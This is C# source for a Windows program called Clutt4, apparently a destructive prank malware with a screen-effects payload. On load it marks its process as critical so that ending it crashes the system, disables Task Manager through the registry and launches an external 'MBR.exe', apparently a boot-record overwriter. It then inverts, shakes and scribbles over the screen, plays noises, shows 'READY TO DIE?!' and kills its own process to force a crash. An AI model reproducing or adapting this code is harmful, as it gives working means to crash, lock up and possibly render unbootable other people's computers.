using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Clutt4
{
    public partial class Payload_start : Form
    {
        [DllImport("gdi32.dll", ExactSpelling = true)]
        private static extern IntPtr BitBlt(IntPtr hDestDC, int x, int y, int nWidth, int nHeight, IntPtr hSrcDC, int xSrc, int ySrc, int dwRop);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

        [DllImport("user32.dll")]
        static extern IntPtr GetWindowDC(IntPtr hWnd);

        public const int NORMAL = 13369376;
        public const int INVERT = 4069376;
        public const int DEMONIC_DARK = 23369376;
        public const int DEMONIC_DARKEN = 31369376;
        public const int LIGHT = 10000000;
        public const int LIGHT2 = 15236820;
        public const int DARKNESS = 19569217;

        [StructLayout(LayoutKind.Sequential)]
        public struct RECT
        {
            public int Left;        // x position of upper-left corner
            public int Top;         // y position of upper-left corner
            public int Right;       // x position of lower-right corner
            public int Bottom;      // y position of lower-right corner
        }

        [DllImport("user32.dll")]
        static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll")]
        static extern IntPtr GetDCEx(IntPtr hwnd, IntPtr hrgn, uint flags);

        [System.Runtime.InteropServices.DllImport("gdi32.dll")]
        internal static extern bool Rectangle(IntPtr hdc, int ulCornerX, int ulCornerY, int lrCornerX, int lrCornerY);

        [DllImport("User32.dll")]
        public static extern IntPtr GetDC(IntPtr hwnd);
        [DllImport("User32.dll")]
        static extern int ReleaseDC(IntPtr hwnd, IntPtr dc);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        [DllImport("gdi32.dll", EntryPoint = "DeleteDC")]
        public static extern bool DeleteDC([In] IntPtr hdc);

        private SoundPlayer annoying_beep, annoying_beep_ext, bass_beep, beep1, beep2, piu, quic_beep, tiny_beep, 
        screen_shake, tv_noise_dirty, tv_super_noise, tv_very_dirty;

        public Payload_start()
        {
            InitializeComponent();
            TransparencyKey = BackColor;

            if(File.Exists(@"C:\Program Files\annoying_beep.wav"))
            {
                annoying_beep = new SoundPlayer(@"C:\Program Files\annoying_beep.wav");
            }
            if (File.Exists(@"C:\Program Files\annoying_beep_extended.wav"))
            {
                annoying_beep_ext = new SoundPlayer(@"C:\Program Files\annoying_beep_extended.wav");
            }
            if (File.Exists(@"C:\Program Files\bass_beep.wav"))
            {
                bass_beep = new SoundPlayer(@"C:\Program Files\bass_beep.wav");
            }
            if (File.Exists(@"C:\Program Files\beep1.wav"))
            {
                beep1 = new SoundPlayer(@"C:\Program Files\beep1.wav");
            }
            if (File.Exists(@"C:\Program Files\beep2.wav"))
            {
                beep2 = new SoundPlayer(@"C:\Program Files\beep2.wav");
            }
            if (File.Exists(@"C:\Program Files\piiiuuu.wav"))
            {
                piu = new SoundPlayer(@"C:\Program Files\piiiuuu.wav");
            }
            if (File.Exists(@"C:\Program Files\quic_beep.wav"))
            {
                quic_beep = new SoundPlayer(@"C:\Program Files\quic_beep.wav");
            }
            if (File.Exists(@"C:\Program Files\tiny_beep.wav"))
            {
                tiny_beep = new SoundPlayer(@"C:\Program Files\tiny_beep.wav");
            }

            if (File.Exists(@"C:\Program Files\screen_shake.wav"))
            {
                screen_shake = new SoundPlayer(@"C:\Program Files\screen_shake.wav");
            }
            if (File.Exists(@"C:\Program Files\tv_noise_dirty.wav"))
            {
                tv_noise_dirty = new SoundPlayer(@"C:\Program Files\tv_noise_dirty.wav");
            }
            if (File.Exists(@"C:\Program Files\tv_super_noise.wav"))
            {
                tv_super_noise = new SoundPlayer(@"C:\Program Files\tv_super_noise.wav");
            }
            if (File.Exists(@"C:\Program Files\tv_very_dirty.wav"))
            {
                tv_very_dirty = new SoundPlayer(@"C:\Program Files\tv_very_dirty.wav");
            }

        }

        private void Payload_start_Load(object sender, EventArgs e)
        {
            int isCritical = 1;  
            int BreakOnTermination = 0x1D;  
            Process.EnterDebugMode();  
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
            RegistryKey rk = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            rk.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
            if (File.Exists(@"C:\Program Files\MBR.exe"))
            {
                Process.Start(@"C:\Program Files\MBR.exe");
            }

            url.Start();
            wtf_msg.Start();
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }

        private void url_Tick(object sender, EventArgs e)
        {
            url.Stop();
            System.Diagnostics.Process.Start("https://www.youtube.com/channel/UC9keh4wDjXFyiRhHDE_h90Q");
            start_blink_invert.Start();
        }

        private void wtf_msg_Tick(object sender, EventArgs e)
        {
            wtf_msg.Stop();
            var NewForm = new system32();
            NewForm.ShowDialog();
        }

        private void start_blink_invert_Tick(object sender, EventArgs e)
        {
            start_blink_invert.Stop();
            invert_blink.Start();
        }

        bool check_process_media_snd = true;

        private void invert_blink_Tick(object sender, EventArgs e)
        {
            if (control_end_invert)
            {


                invert_blink.Stop();
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                RECT myRect;
                GetWindowRect(hwnd, out myRect);

                int x = 0;
                int y = 0;

                BitBlt(hdc, x, y, myRect.Right, myRect.Bottom, hdc, 0, 0, INVERT);
                ReleaseDC(hwnd, hdc);

                if (check_process_media_snd && File.Exists(@"C:\Program Files\media_snd.exe"))
                {
                    Process.Start(@"C:\Program Files\media_snd.exe");
                    check_process_media_snd = false;
                }
                if (invert_blink.Interval >= 101)
                {
                    invert_blink.Interval -= 100;
                }
                else if (invert_blink.Interval >= 11)
                {
                    invert_blink.Interval -= 10;
                }
                else
                {
                    mouse_draw_ikon.Start();
                    time_to_rnd_icons.Start();
                }
                invert_blink.Start();
            }
        }

        private void mouse_draw_ikon_Tick(object sender, EventArgs e)
        {
            if (control_rectangle)
            {
                mouse_draw_ikon.Stop();
                this.Cursor = new Cursor(Cursor.Current.Handle);
                int posX = Cursor.Position.X;
                int posY = Cursor.Position.Y;

                Bitmap bitmap = new Bitmap(er1.Image);


                IntPtr desktop = GetDC(IntPtr.Zero);
                using (Graphics g = Graphics.FromHdc(desktop))
                {

                    g.DrawImage(bitmap, posX, posY, 30, 30);

                }
                ReleaseDC(IntPtr.Zero, desktop);
                mouse_draw_ikon.Start();
            }
        }

        bool control_end_invert = true;

        private void time_to_rnd_icons_Tick(object sender, EventArgs e)
        {
            if (control_rectangle)
            {
                time_to_rnd_icons.Stop();
                if (control_end_invert)
                {
                    time_to_rnd_icons.Interval = 300;
                    if (File.Exists(@"C:\Program Files\media_snd.exe"))
                    {
                        Process.Start(@"C:\Program Files\media_snd.exe");
                    }
                    control_end_invert = false;
                    rectangles.Start();
                }

                Random r;
                r = new Random();
                Bitmap bitmap = new Bitmap(er1.Image);
                Bitmap bitmap2 = new Bitmap(er_shield.Image);
                Bitmap bitmap3 = new Bitmap(uac1.Image);
                Bitmap bitmap4 = new Bitmap(war1.Image);

                IntPtr desktop = GetDC(IntPtr.Zero);
                using (Graphics g = Graphics.FromHdc(desktop))
                {
                    g.DrawImage(bitmap, r.Next(0, Screen.PrimaryScreen.Bounds.Width),
                     r.Next(0, Screen.PrimaryScreen.Bounds.Height));
                }

                IntPtr desktop2 = GetDC(IntPtr.Zero);
                using (Graphics g = Graphics.FromHdc(desktop2))
                {
                    g.DrawImage(bitmap2, r.Next(0, Screen.PrimaryScreen.Bounds.Width),
                     r.Next(0, Screen.PrimaryScreen.Bounds.Height));
                }

                IntPtr desktop3 = GetDC(IntPtr.Zero);
                using (Graphics g = Graphics.FromHdc(desktop3))
                {
                    g.DrawImage(bitmap3, r.Next(0, Screen.PrimaryScreen.Bounds.Width),
                     r.Next(0, Screen.PrimaryScreen.Bounds.Height));
                }

                IntPtr desktop4 = GetDC(IntPtr.Zero);
                using (Graphics g = Graphics.FromHdc(desktop4))
                {
                    g.DrawImage(bitmap4, r.Next(0, Screen.PrimaryScreen.Bounds.Width),
                     r.Next(0, Screen.PrimaryScreen.Bounds.Height));
                }
                time_to_rnd_icons.Start();
            }
        }

        bool control_rectangle = true;
        bool special_msg = true;

        private void rectangles_Tick(object sender, EventArgs e)
        {
            if (normalshake)
            {

                rectangles.Stop();
                Random r;
                r = new Random();
                int x = r.Next(50, 500);
                int y = r.Next(30, 300);
                int widht_float = r.Next(1, 10);
                if (control_rectangle)
                {
                    invert_blink.Stop();
                    time_to_rnd_icons.Stop();
                    mouse_draw_ikon.Stop();
                    control_rectangle = false;
                    rectangles.Interval = 100;
                    beep_glitch.Start();
                    normal_shake.Start();

                }
                IntPtr desktop = GetDC(IntPtr.Zero);
                using (Graphics g = Graphics.FromHdc(desktop))
                {
                    g.DrawRectangle(new Pen(Color.Red, widht_float), new Rectangle(r.Next(0, Screen.PrimaryScreen.Bounds.Width), r.Next(0, Screen.PrimaryScreen.Bounds.Height), x, y));
                }
                IntPtr desktop2 = GetDC(IntPtr.Zero);
                using (Graphics g = Graphics.FromHdc(desktop2))
                {
                    g.DrawRectangle(new Pen(Color.Blue, widht_float), new Rectangle(r.Next(0, Screen.PrimaryScreen.Bounds.Width), r.Next(0, Screen.PrimaryScreen.Bounds.Height), x, y));
                }
                IntPtr desktop3 = GetDC(IntPtr.Zero);
                using (Graphics g = Graphics.FromHdc(desktop3))
                {
                    g.DrawRectangle(new Pen(Color.Green, widht_float), new Rectangle(r.Next(0, Screen.PrimaryScreen.Bounds.Width), r.Next(0, Screen.PrimaryScreen.Bounds.Height), x, y));
                }
                IntPtr desktop4 = GetDC(IntPtr.Zero);
                using (Graphics g = Graphics.FromHdc(desktop4))
                {
                    g.DrawRectangle(new Pen(Color.Pink, widht_float), new Rectangle(r.Next(0, Screen.PrimaryScreen.Bounds.Width), r.Next(0, Screen.PrimaryScreen.Bounds.Height), x, y));
                }
                IntPtr desktop5 = GetDC(IntPtr.Zero);
                using (Graphics g = Graphics.FromHdc(desktop))
                {
                    g.DrawRectangle(new Pen(Color.Yellow, widht_float), new Rectangle(r.Next(0, Screen.PrimaryScreen.Bounds.Width), r.Next(0, Screen.PrimaryScreen.Bounds.Height), x, y));
                }
                rectangles.Start();
                if (special_msg)
                {
                    special_msg = false;
                    MessageBox.Show("READY TO DIE?!", "CLUTT4", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void beep_glitch_Tick(object sender, EventArgs e)
        {
            if (normalshake)
            {
                beep_glitch.Stop();
                Random r;
                r = new Random();
                int rnd_snd = r.Next(9);

                if (rnd_snd == 1)
                {
                    if (File.Exists(@"C:\Program Files\annoying_beep.wav"))
                    {
                        annoying_beep.Play();
                    }
                }
                if (rnd_snd == 2)
                {
                    if (File.Exists(@"C:\Program Files\annoying_beep_extended.wav"))
                    {
                        annoying_beep_ext.Play();
                    }
                }
                if (rnd_snd == 3)
                {
                    if (File.Exists(@"C:\Program Files\bass_beep.wav"))
                    {
                        bass_beep.Play();
                    }
                }
                if (rnd_snd == 4)
                {
                    if (File.Exists(@"C:\Program Files\beep1.wav"))
                    {
                        beep1.Play();
                    }
                }
                if (rnd_snd == 5)
                {
                    if (File.Exists(@"C:\Program Files\beep2.wav"))
                    {
                        beep2.Play();
                    }
                }
                if (rnd_snd == 6)
                {
                    if (File.Exists(@"C:\Program Files\piiiuuu.wav"))
                    {
                        piu.Play();
                    }
                }
                if (rnd_snd == 7)
                {
                    if (File.Exists(@"C:\Program Files\quic_beep.wav"))
                    {
                        quic_beep.Play();
                    }
                }
                if (rnd_snd == 8)
                {
                    if (File.Exists(@"C:\Program Files\tiny_beep.wav"))
                    {
                        tiny_beep.Play();
                    }
                }

                beep_glitch.Start();
            }
        }

        bool normalshake = true;

        private void normal_shake_Tick(object sender, EventArgs e)
        {
            normal_shake.Stop();
            if (normalshake)
            {
                beep_glitch.Stop();
                normal_shake.Interval = 1000;
                normalshake = false;
                screen_shake.PlayLooping();
                shake_invert.Start();
            }
            if (normal_shake.Interval >= 101)
            {
                normal_shake.Interval -= 100;
            }
            else if (normal_shake.Interval >= 11)
            {
                normal_shake.Interval -= 10;
            }
            else
            {
                normal_shake.Interval = 10;
            }
            Random r;
            r = new Random();
            int x = r.Next(-50, 50);
            int y = r.Next(-50, 50);

            IntPtr hwnd = GetDesktopWindow();
            IntPtr hdc = GetWindowDC(hwnd);
            RECT myRect;
            GetWindowRect(hwnd, out myRect);

            BitBlt(hdc, x, y, myRect.Right, myRect.Bottom, hdc, 0, 0, NORMAL);
            ReleaseDC(hwnd, hdc);
            normal_shake.Start();
            
        }

        bool invertshake = true;
        bool stop_invert = true;

        private void shake_invert_Tick(object sender, EventArgs e)
        {
            if (stop_invert)
            {
                shake_invert.Stop();
                if (invertshake)
                {
                    shake_invert.Interval = 1000;
                    invertshake = false;
                    dark_invert.Start();
                }
                else if (shake_invert.Interval >= 101)
                {
                    shake_invert.Interval -= 100;
                }
                else if (shake_invert.Interval >= 11)
                {
                    shake_invert.Interval -= 10;
                }
                else
                {
                    shake_invert.Interval = 10;
                }

                Random r;
                r = new Random();
                int x = 1;
                int y = 1;

                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                RECT myRect;
                GetWindowRect(hwnd, out myRect);

                BitBlt(hdc, x, y, myRect.Right, myRect.Bottom, hdc, 0, 0, INVERT);
                ReleaseDC(hwnd, hdc);

                shake_invert.Start();
            }
            
        }

        bool darkinvert = true;
        private void dark_invert_Tick(object sender, EventArgs e)
        {

            dark_invert.Stop();
            if (darkinvert)
            {
                dark_invert.Interval = 1000;
                screen_shake.Stop();
                tv_super_noise.PlayLooping();
                darkinvert = false;
                final_shake.Start();
                shake_invert.Stop();
                stop_invert = false;

            }
            if(dark_invert.Interval >= 101)
            {
                dark_invert.Interval -= 100;
            }
            else if(dark_invert.Interval >= 11)
            {
                dark_invert.Interval -= 10;
            }
            else
            {
                dark_invert.Interval = 10;
            }
            Random r;
            r = new Random();
            int x = 1;
            int y = 1;

            IntPtr hwnd = GetDesktopWindow();
            IntPtr hdc = GetWindowDC(hwnd);
            RECT myRect;
            GetWindowRect(hwnd, out myRect);

            BitBlt(hdc, x, y, myRect.Right, myRect.Bottom, hdc, 0, 0, LIGHT2);
            ReleaseDC(hwnd, hdc);
            dark_invert.Start();
        }

        bool lastshake = true;
        private void final_shake_Tick(object sender, EventArgs e)
        {
            final_shake.Stop();
            if (lastshake)
            {
                final_shake.Interval = 3000;
                tv_super_noise.Stop();
                tv_noise_dirty.PlayLooping();
                bsod_time.Start();
                lastshake = false;
            }

            if (final_shake.Interval >= 101)
            {
                final_shake.Interval -= 100;
            }
            else if (final_shake.Interval >= 11)
            {
                final_shake.Interval -= 10;
            }
            else
            {
                final_shake.Interval = 10;
            }

            Random r;
            r = new Random();
            int x = r.Next(-50, 50);
            int y = r.Next(-50, 50);

            IntPtr hwnd = GetDesktopWindow();
            IntPtr hdc = GetWindowDC(hwnd);
            RECT myRect;
            GetWindowRect(hwnd, out myRect);

            BitBlt(hdc, x, y, myRect.Right, myRect.Bottom, hdc, 0, 0, DEMONIC_DARK);
            ReleaseDC(hwnd, hdc);
            final_shake.Start();
        }

        private void bsod_time_Tick(object sender, EventArgs e)
        {
            bsod_time.Stop();
            tv_noise_dirty.Stop();
            this.Hide();
            this.Close();
            Application.Exit();
            Process[] _proceses = null;
            _proceses = Process.GetProcessesByName("Clutt4");
            foreach (Process proces in _proceses)
            {
                proces.Kill();
            }
            Thread.Sleep(999999);
        }
    }
}
